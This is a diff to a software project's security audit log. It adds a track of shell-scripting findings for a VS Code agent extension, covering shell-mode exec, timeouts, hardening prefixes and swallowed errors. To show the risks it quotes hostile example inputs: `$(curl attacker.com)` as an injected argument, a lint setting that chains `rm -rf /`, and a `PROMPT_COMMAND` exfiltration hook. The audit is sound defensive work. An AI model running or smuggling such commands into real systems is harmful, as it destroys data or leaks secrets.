@@ -1430,7 +1430,7 @@ Historical audit cycles in reverse-chronological order. Cycle-3 findings (v0.58.
 
 ### Cycle-4 audit — comprehensive quality pass (post-v0.79.0, 2026-04-21)
 
-Eighteen-track audit launched after v0.79.0. All 18 tracks completed 2026-04-21. Findings folded into v0.80 refactor beat and individual backlog items below.
+Nineteen-track audit launched after v0.79.0. All 19 tracks completed 2026-04-21. Findings folded into v0.80 refactor beat and individual backlog items below.
 
 ---
 
@@ -1797,6 +1797,24 @@ Scope: arbitrary code execution entry points · process spawning security · tem
 - **LOW** The per-command shell hardening prefix in `src/terminal/shellSession.ts:56` resets aliases, functions, `PATH` override attempts, and other shell state before each agent command. This is a well-implemented defense against command-chaining attacks where an earlier agent command defines a malicious `ls` alias that executes on a subsequent `ls` call. The hardening is noted here as a positive control that should be preserved and regression-tested.
 - **LOW** No local TCP/UDP/WebSocket listeners are opened by SideCar at any point — communication to VS Code's webview is exclusively via VS Code's message-passing API, and backend LLM calls go outbound only. This eliminates local network attack surface entirely. Noted as a clean bill of health for this category.
 - **LOW** `custom tool` variable expansion: workspace-defined commands that reference `$SIDECAR_INPUT` without quoting (e.g., `grep $SIDECAR_INPUT /var/log/app.log`) are vulnerable to shell metacharacter injection if the LLM supplies input containing `$(...)`, backticks, or unescaped quotes. Track 1 already logs this as HIGH under "custom tool executor shell-escaping"; this entry adds the concrete example (`$(curl attacker.com)` as input to an unquoted `grep $SIDECAR_INPUT` template) and recommends the custom tool docs explicitly require `"$SIDECAR_INPUT"` quoting.
+
+---
+
+#### Track 19 — Shell Scripting Quality ✅
+
+Scope: shell script robustness · npm script chaining · process spawning correctness · shell hardening completeness · `exec` vs `execFile` safety · timeout plumbing across `scripts/bump-version.sh`, `package.json`, `src/terminal/shellSession.ts`, `src/agent/executor/`, and `src/agent/lintFix.ts`.
+
+- **CRITICAL** `src/agent/lintFix.ts:63` runs the user-configured `lintCmd` string via `execAsync()` which uses `child_process.exec` (shell mode), not `execFile`. The full command string is passed to the shell as-is — a workspace setting of `"eslint . ; rm -rf /"` would execute both commands. Fix: parse `lintCmd` into argv (e.g., split on whitespace, honor quotes) and invoke `execFile` with an explicit array, or validate `lintCmd` against an allowlist of known-safe lint commands.
+- **CRITICAL** `src/agent/tools/vision.ts:391` spawns the Playwright child process via `child_process.spawn()` with `timeout: timeoutMs`, but the `timeout` option is only honored by `child_process.exec`/`execFile` — `spawn()` silently ignores it. A hung or infinite-loop Playwright script will run until the VS Code extension is restarted. Fix: implement timeout using `AbortController`: `const ac = new AbortController(); setTimeout(() => ac.abort(), timeoutMs); spawn(..., { signal: ac.signal })`.
+- **HIGH** `scripts/bump-version.sh` Python mutation blocks at lines 73–91 and 119–131 are invoked as `python3 -c "..." 2>/dev/null || true` — errors (file not found, parse failures, regex mismatches) are silently swallowed and the script exits 0. The version bump can complete with `docs/index.html` and `CHANGELOG.md` unchanged. Fix: remove `|| true`; let Python errors propagate and fail the script explicitly so the CI operator knows a file was not updated.
+- **HIGH** `scripts/bump-version.sh:40` extracts test counts with `grep ... || echo "?"`. If the test runner output format changes, the count silently becomes `"?"` and the wrong stats are published in docs. Fix: validate that extracted values are non-empty integers (`[[ "$TEST_TOTAL" =~ ^[0-9]+$ ]]`) and fail with an explicit error message if not.
+- **HIGH** `package.json` `test:integration` script: `find src -name '*.js' ... -delete 2>/dev/null; vscode-test`. The `;` separator means `vscode-test` runs even if `find -delete` fails, and `2>/dev/null` silently swallows find errors. Fix: replace `;` with `&&` and remove `2>/dev/null` so a failed cleanup blocks the test run with a visible error.
+- **MEDIUM** `src/agent/spawnHook.ts:100` truncates hook output by keeping the first chunk after the size limit is reached and then silently dropping all subsequent chunks. If a hook emits a large file and then fails, the failure message — typically in the last few lines of output — is dropped. Fix: keep a fixed-size tail ring buffer (e.g., last 4 KB) even after truncation, so error messages are preserved.
+- **MEDIUM** The bash hardening prefix in `src/terminal/shellSession.ts:56` resets aliases and shell functions, but does not unset `PROMPT_COMMAND` or `BASH_ENV`. An earlier agent command that sets `PROMPT_COMMAND='exfil_secrets'` will persist and execute before every subsequent command in the session. Fix: add `unset PROMPT_COMMAND BASH_ENV CDPATH 2>/dev/null;` to the bash prefix.
+- **MEDIUM** The zsh hardening prefix resets aliases and functions (`unalias -m '*'; unfunction -m '*'`) but does not clear zsh `precmd` and `preexec` hook arrays. A prior `precmd` registration persists across commands. Fix: add `add-zsh-hook -d precmd ...; precmd_functions=(); preexec_functions=();` to the zsh prefix.
+- **MEDIUM** `src/github/git.ts:15` calls `execFile('git', ...)` with no `timeout` option. On a repository with a slow or unreachable remote, `git fetch` or `git log --all` can hang indefinitely and block the tool executor. Fix: add `timeout: 30_000` (30 s) to all `execFile` git calls.
+- **MEDIUM** `scripts/bump-version.sh:62` uses `sed -i ''` (BSD/macOS syntax). On Linux CI runners (Ubuntu), the correct syntax is `sed -i` without the empty string. Fix: use a portable pattern — `sed -i.bak "..." file && rm -f file.bak` — or detect the platform with `uname` and branch.
+- **LOW** `src/agent/tools/search.ts:93` sets `maxBuffer: 512 * 1024` (512 KB) for `grep` output. On monorepos with thousands of files, grep can return several megabytes. When the buffer is exceeded, `execFileAsync` rejects and the tool returns an error rather than truncated results. Fix: raise to `2 * 1024 * 1024` (2 MB) and add a soft limit via `--max-count` or `head` piping so large result sets are truncated gracefully rather than throwing.
 
 ---
 
